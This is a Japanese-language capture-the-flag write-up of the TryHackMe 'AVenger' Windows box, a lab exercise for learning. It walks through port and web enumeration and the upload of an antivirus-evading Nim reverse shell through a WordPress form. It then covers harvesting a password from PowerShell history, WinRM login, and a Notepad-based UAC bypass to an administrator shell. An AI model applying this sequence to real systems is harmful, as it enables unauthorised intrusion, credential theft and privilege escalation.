# AVenger CTF

https://tryhackme.com/room/avenger

## Enumeration

```shell
TARGET=10.48.178.52
sudo bash -c "echo $TARGET   avenger >> /etc/hosts"
```

### ポートスキャン

```sh
nmap -v -p- -Pn --min-rate 10000 $TARGET

PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
443/tcp   open     https
445/tcp   open     microsoft-ds
644/tcp   filtered dwr
996/tcp   filtered xtreelic
3306/tcp  open     mysql
3330/tcp  filtered mcs-calypsoicf
3389/tcp  open     ms-wbt-server
5985/tcp  open     wsman
6103/tcp  filtered RETS-or-BackupExec
6223/tcp  filtered unknown
7680/tcp  open     pando-pub
8640/tcp  filtered unknown
8849/tcp  filtered unknown
12641/tcp filtered unknown
15232/tcp filtered unknown
16291/tcp filtered unknown
17417/tcp filtered unknown
18969/tcp filtered unknown
20551/tcp filtered unknown
21780/tcp filtered unknown
22135/tcp filtered unknown
24135/tcp filtered unknown
24230/tcp filtered unknown
24421/tcp filtered unknown
28951/tcp filtered unknown
29737/tcp filtered unknown
30155/tcp filtered unknown
30650/tcp filtered unknown
31227/tcp filtered unknown
32520/tcp filtered unknown
38659/tcp filtered unknown
39953/tcp filtered unknown
41929/tcp filtered unknown
42679/tcp filtered unknown
43615/tcp filtered unknown
47001/tcp open     winrm
48049/tcp filtered 3gpp-cbsp
48192/tcp filtered unknown
48979/tcp filtered unknown
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49669/tcp open     unknown
49670/tcp open     unknown
49671/tcp open     unknown
49674/tcp open     unknown
49940/tcp filtered unknown
52894/tcp filtered unknown
53126/tcp filtered unknown
53991/tcp filtered unknown
56011/tcp filtered unknown
56592/tcp filtered unknown
56768/tcp filtered unknown
60447/tcp filtered unknown
60493/tcp filtered unknown
64578/tcp filtered unknown
64977/tcp filtered unknown
```

```sh
nmap -sV -p80,135,139,443,445,3306,3389,5985,7680,47001,49664,49665,49666,49667,49669,49670,49671,49674 $TARGET

PORT      STATE  SERVICE       VERSION
80/tcp    open   http          Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open   ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
445/tcp   open   microsoft-ds?
3306/tcp  open   mysql         MySQL 5.5.5-10.4.28-MariaDB
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp  closed pando-pub
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
49670/tcp open   msrpc         Microsoft Windows RPC
49671/tcp open   msrpc         Microsoft Windows RPC
49674/tcp open   msrpc         Microsoft Windows RPC
```

```sh
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.26 seconds
root@ip-10-48-74-239:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.48.178.52
+ Target Hostname:    avenger
+ Target Port:        80
+ Start Time:         2025-12-17 01:25:35 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+ The anti-clickjacking X-Frame-Options header is not present.
+ OSVDB-3268: /: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0x78ae 0x51affc7a4c400 
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ 1707 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2025-12-17 01:25:38 (GMT0) (3 seconds)
---------------------------------------------------------------------------
```

SMBは無名接続できなかった。

```sh
$ smbclient -L //$TARGET -N
session setup failed: NT_STATUS_ACCESS_DENIED

$ smbclient -L //$TARGET -U ""
Password for [WORKGROUP\]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://10.48.178.52/ ----
+ http://10.48.178.52/aux (CODE:403|SIZE:302)                                                                        
+ http://10.48.178.52/cgi-bin/ (CODE:403|SIZE:302)                                                                   
+ http://10.48.178.52/com1 (CODE:403|SIZE:302)                                                                       
+ http://10.48.178.52/com2 (CODE:403|SIZE:302)                                                                       
+ http://10.48.178.52/com3 (CODE:403|SIZE:302)                                                                       
+ http://10.48.178.52/con (CODE:403|SIZE:302)                                                                        
==> DIRECTORY: http://10.48.178.52/dashboard/                                                                        
+ http://10.48.178.52/examples (CODE:503|SIZE:402)                                                                   
+ http://10.48.178.52/favicon.ico (CODE:200|SIZE:30894)                                                              
==> DIRECTORY: http://10.48.178.52/gift/                                                                             
==> DIRECTORY: http://10.48.178.52/img/                                                                              
+ http://10.48.178.52/licenses (CODE:403|SIZE:421)                                                                   
+ http://10.48.178.52/lpt1 (CODE:403|SIZE:302)                                                                       
+ http://10.48.178.52/lpt2 (CODE:403|SIZE:302)                                                                       
+ http://10.48.178.52/nul (CODE:403|SIZE:302)                                                                        
+ http://10.48.178.52/phpmyadmin (CODE:403|SIZE:302)                                                                 
+ http://10.48.178.52/prn (CODE:403|SIZE:302)                                                                        
+ http://10.48.178.52/server-info (CODE:403|SIZE:421)                                                                
+ http://10.48.178.52/server-status (CODE:403|SIZE:421)                                                              
+ http://10.48.178.52/webalizer (CODE:403|SIZE:421)                                                                  
==> DIRECTORY: http://10.48.178.52/wordpress/
```

## web

ソースを見ると、http://avenger.tryhackme/ というドメイン名が使われていた。VHOSTは見つからなかった。

```sh
sudo bash -c "echo $TARGET   avenger.tryhackme >> /etc/hosts"
```

```sh
ffuf -u http://avenger.tryhackme -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.avenger.tryhackme' -fw 219
```

### dashboard

`Welcome to XAMPP for Windows 8.0.28`

### gift

ソースを見るとWordpress。wpscan

```sh
$ wpscan --url http://avenger.tryhackme/gift/ -e

[+] WordPress version 6.2.2 identified (Insecure, released on 2023-05-20)

[+] WordPress theme in use: astra
 | Version: 4.1.5 (80% confidence)

[i] User(s) Identified:
[+] admin
```

-e を付けずに実行したら下記も出た。

```sh
[+] forminator
 | Location: http://avenger.tryhackme/gift/wp-content/plugins/forminator/
 | Latest Version: 1.14.9 (up to date)
 | Last Updated: 2021-03-11T23:40:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.24.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/forminator/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/forminator/readme.txt

[+] ultimate-addons-for-gutenberg
 | Location: http://avenger.tryhackme/gift/wp-content/plugins/ultimate-addons-for-gutenberg/
 | Latest Version: 1.21.1 (up to date)
 | Last Updated: 2021-03-15T09:32:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 2.6.9 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/ultimate-addons-for-gutenberg/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/ultimate-addons-for-gutenberg/readme.txt
```

forminator の脆弱性検索。1.24.1 と完全一致はしていない。

これに対応するエクスプロイト  
https://github.com/E1A/CVE-2023-4596/blob/main/exploit.py

```sh
$ searchsploit forminator    
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Forminator 1.24.6 - Unauthenticated Remote Command Execution                                                                                                                           | php/webapps/51664.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

/gift/ トップページの下の方にForminatorのフォームがあり、適当に送信したら、チームが内容を確認するというメッセージが表示された。

```
Thank you for your submission. Our team is delighted to review every message carefully. You will hear from us shortly!
```

- httpのURLを入れてもリクエストは来なかった。
- XSSを試したが反応がない

AVが稼働しているという説明があったので、Nim のリバースシェルをビルドしてアップロードしてみたら、シェルを取れた。

https://github.com/Sn1r/Nim-Reverse-Shell

```sh
$ nc -lnvp 8888               
listening on [any] 8888 ...
connect to [192.168.138.236] from (UNKNOWN) [10.48.179.112] 49866
C:\Windows\system32>
```

ユーザーフラグ。

```sh
C:\Users\hugo\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\hugo\Desktop

07/10/2023  09:40 PM    <DIR>          .
07/10/2023  09:40 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
07/25/2023  02:14 PM                48 user.txt
               3 File(s)          1,129 bytes
               2 Dir(s)  10,923,659,264 bytes free
```

## 権限昇格

特権はない。

```sh
C:\Users\hugo\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Powershell履歴を見ると、パスワードらしき文字列をはじめ興味深い内容が大量に含まれているが、役に立つかは不明。

```sh
C:\Users\hugo\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> type ConsoleHost_history.txt
```

Powershell履歴で入手したパスワードを使って、evil-winrm でログインできた。

```sh
$ evil-winrm -i 10.48.132.66 -u hugo -p [REDACTED]
```

PrivescCheck.ps1 をアップロードして実行。

```sh
*Evil-WinRM* PS C:\Users\hugo> Set-ExecutionPolicy Bypass -Scope process -Force
*Evil-WinRM* PS C:\Users\hugo> . .\PrivescCheck.ps1
*Evil-WinRM* PS C:\Users\hugo> Invoke-PrivescCheck
```

入手済みのパスワードが出てきただけ。

```sh
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
┃ NAME     ┃ Credentials - WinLogon                            ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the 'WinLogon' registry key contains           ┃
┃ clear-text credentials. Note that entries with an empty      ┃
┃ password field are filtered out.                             ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


Domain   :
Username : hugo
Password : [REDACTED]



[*] Status: Vulnerable - Severity: Medium - Execution time: 00:00:00.060

Warning: Check 'Credentials - Vault (creds)' is categorized as risky, but the option '-Risky' was not specified, ignoring...
Warning: Check 'Credentials - Vault (list)' is categorized as risky, but the option '-Risky' was not specified, ignoring...
```

リモートデスクトップでログインしたらノートパッドで下記が開かれていた。

```
while ($true){ Start-Sleep -Second 30;Get-ChildItem -Path "C:\\xampp\\htdocs\\gift\\wp-content\\uploads\\forminator\\1176_bfb25fcc9ab03b0c3d853234c0a45028\\uploads" | ForEach-Object {Start-Process $_.FullName};}
```

ポイントは、BUILTIN\Administrators グループに属していること。つまり「管理者として実行」が可能。  
リモートデスクトップ接続できたのは、このグループに属していたからだったらしい。

```sh
*Evil-WinRM* PS C:\Users\hugo\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
...
```

下記の手順で管理者シェルを取得できた。

1. リモートデスクトップ上でノートパッドを管理者権限で開く
2. File -> Open で、C:/Windows/System32 に移動、cmd.exe を右クリックして管理者権限で開く

```sh
C:\Users>cd Administrator

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

07/10/2023  09:40 PM    <DIR>          .
07/10/2023  09:40 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
07/25/2023  02:14 PM                26 root.txt
               3 File(s)          1,107 bytes
               2 Dir(s)  10,922,192,896 bytes free

C:\Users\Administrator\Desktop>type root.txt
THM{[REDACTED]}
```

## 振り返り

- PHPアップロードと見せかけて添付ファイルが実行される斬新なBOX。
- `BUILTIN\Administrators`グループに属していて、リモートデスクトップのポートが開いている場合、ノートパッドを使って一発で管理者シェルを取れる。
- 自分はNimを試したら成功したのであまり掘り下げなかったが、AV回避やAMSI回避についてウォークスルーで詳しく検討されている。自信が無いので継続して勉強が必要。

https://0xb0b.gitbook.io/writeups/tryhackme/2023/avenger#privilege-escalation

## Tags

#tags:Windows #tags:AVバイパス #tags:UACバイパス #tags:AMSIバイパス
